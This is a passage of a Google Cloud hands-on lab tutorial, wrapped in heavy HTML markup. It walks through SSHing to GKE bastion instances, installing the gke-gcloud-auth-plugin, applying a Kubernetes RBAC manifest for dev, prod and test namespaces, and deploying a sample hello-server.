&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  10.0.96.6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rbac-demo-cluster-default-pool-a9cd3468-rt5p &nbsp;  europe-west4-a  n1-standard-1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  10.0.96.7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gke-tutorial-auditor &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  europe-west4-a  f1-micro &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.0.96.4 &nbsp;  35.224.148.28 &nbsp;  RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gke-tutorial-admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  europe-west4-a  f1-micro &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.0.96.3 &nbsp;  35.226.237.142 &nbsp; RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gke-tutorial-owner &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  europe-west4-a  f1-micro &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.0.96.2 &nbsp;  35.194.58.130 &nbsp;  RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 315px;"></div><div class="CodeMirror-gutters" style="display: none; height: 315px;"></div></div></div></pre><h3 id='creating-the-rbac-rules'><span>Creating the RBAC rules</span></h3><p><span>Create the Namespaces, Roles, and RoleBindings by logging into the admin instance and applying the </span><code>rbac.yaml</code><span> manifest.</span></p><ol start='' ><li><p><span>SSH to the admin:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh gke-tutorial-admin</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> Ignore the error which relates to gcp auth plugin.</span></p><p><span>Existing versions of kubectl and custom Kubernetes clients contain provider-specific code to manage authentication between the client and Google Kubernetes Engine. Starting with v1.26, this code will no longer be included as part of the OSS kubectl. GKE users will need to download and use a separate authentication plugin to generate GKE-specific tokens. This new binary, </span><code>gke-gcloud-auth-plugin</code><span>, uses the </span><a href='https://kubernetes.io/docs/reference/access-authn-authz/authentication/#client-go-credential-plugins'><span>Kubernetes Client-go Credential Plugin</span></a><span> mechanism to extend kubectl’s authentication to support GKE. For more information, you can check out the following </span><a href='https://cloud.google.com/blog/products/containers-kubernetes/kubectl-auth-changes-in-gke'><span>documentation</span></a><span>.</span></p><p><span>To have kubectl use the new binary plugin for authentication instead of using the default provider-specific code, use the following steps.</span></p><ol start='' ><li><p><span>Once connected, run the following command to install the </span><code>gke-gcloud-auth-plugin</code><span> on the VM.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Set </span><code>export USE_GKE_GCLOUD_AUTH_PLUGIN=True</code><span> in </span><code>~/.bashrc</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "export USE_GKE_GCLOUD_AUTH_PLUGIN=True" &gt;&gt; ~/.bashrc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source ~/.bashrc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to force the config for this cluster to be updated to the Client-go Credential Plugin configuration.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials rbac-demo-cluster --zone europe-west4-a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>On success, you should see this message pop up:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Kubeconfig entry generated for dev-cluster.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>The newly-created cluster will now be available for the standard </span><code>kubectl</code><span> commands on the bastion.</span></p><ol start='' ><li><p><span>Create the namespaces, roles, and bindings:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f ./manifests/rbac.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">namespace/dev created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">namespace/prod created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">namespace/test created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">role.rbac.authorization.k8s.io/dev-ro created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clusterrole.rbac.authorization.k8s.io/all-rw created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clusterrolebinding.rbac.authorization.k8s.io/owner-binding created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rolebinding.rbac.authorization.k8s.io/auditor-binding created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Creating the RBAC rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='managing-resources-as-the-owner'><span>Managing resources as the owner</span></h3><ol start='' ><li><p><span>Open a new Cloud Shell terminal by clicking the </span><strong><span>+</span></strong><span> at the top of the terminal window.</span></p></li></ol><p><span>You will now SSH into the owner instance and create a simple deployment in each namespace.</span></p><ol start='' ><li><p><span>SSH to the &quot;owner&quot; instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh gke-tutorial-owner</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> Ignore the error which relates to gcp auth plugin.</span></p><ol start='' ><li><p><span>When prompted about the zone, enter </span><code>n</code><span>, so the default zone is used.</span></p></li><li><p><span>Install gke-gcloud-auth-plugin:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "export USE_GKE_GCLOUD_AUTH_PLUGIN=True" &gt;&gt; ~/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source ~/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials rbac-demo-cluster --zone europe-west4-a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create a server in each namespace, first </span><code>dev</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create -n dev -f ./manifests/hello-server.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">service/hello-server created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-server created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>And then </span><code>prod</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create -n prod -f ./manifests/hello-server.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">service/hello-server created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-server created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>Then </span><code>test</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 